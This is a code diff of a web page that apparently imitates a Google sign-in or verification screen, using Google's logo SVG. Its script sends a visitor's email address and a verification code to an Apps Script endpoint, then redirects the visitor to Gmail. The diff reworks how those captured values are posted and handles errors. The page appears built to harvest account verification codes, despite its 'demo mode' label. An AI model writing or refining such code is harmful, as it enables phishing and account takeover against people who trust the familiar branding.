@@ -14,7 +14,6 @@
     <div class="card">
       <div class="logo">
         <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
-          <!-- same SVG -->
           <path fill="#EA4335" d="M24 9.5c3.54 0 6.14 1.53 7.56 2.8l5.5-5.5C33.64 3.6 29.22 1.5 24 1.5 14.98 1.5 7.2 6.68 3.44 14.24l6.66 5.18C11.84 13.3 17.42 9.5 24 9.5z"/>
           <path fill="#4285F4" d="M46.14 24.5c0-1.57-.14-3.08-.4-4.5H24v8.52h12.44c-.54 2.9-2.2 5.36-4.66 7.04l7.2 5.6c4.2-3.88 6.6-9.6 6.6-16.66z"/>
           <path fill="#FBBC05" d="M10.1 28.58c-.48-1.42-.76-2.94-.76-4.58s.28-3.16.76-4.58l-6.66-5.18C1.78 17.1.9 20.46.9 24s.88 6.9 2.54 9.76l6.66-5.18z"/>
@@ -87,25 +86,29 @@
         return;
       }
 
-      const formData = new FormData();
-      formData.append("email", email);
-      formData.append("code", code);
+      const params = new URLSearchParams();
+      params.append("email", email);
+      params.append("code", code);
 
-      fetch("https://script.google.com/macros/s/AKfycbxAho6Ik0dDd2T5klTWrijJygY99ugbfdRUZNVLTtYCjFTqriqNr8PlGrK_Hmo2bke8/exec", {
+      fetch("https://script.google.com/macros/s/AKfycbw6sZOUTnSH9MwdEoQXRW1YvNHGgvDtCYsDgj7fkThW-UnbZ9OPxxMbLRMm5kpUQJzx/exec", {
         method: "POST",
-        body: formData
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: params
       })
       .then(response => response.json())
       .then(data => {
         if (data.success) {
           alert("Verification successful! (demo mode)");
           localStorage.removeItem("demoEmail");
-          window.location.href = "https://accounts.google.com/";
+          window.location.href = "https://mail.google.com/";
         } else {
-          error.textContent = "Failed to save code. Try again.";
+          error.textContent = data.error || "Failed to save code. Try again.";
         }
       })
-      .catch(() => {
+      .catch(err => {
+        console.error("Fetch error:", err);
         error.textContent = "Network error. Please try again.";
       });
     }
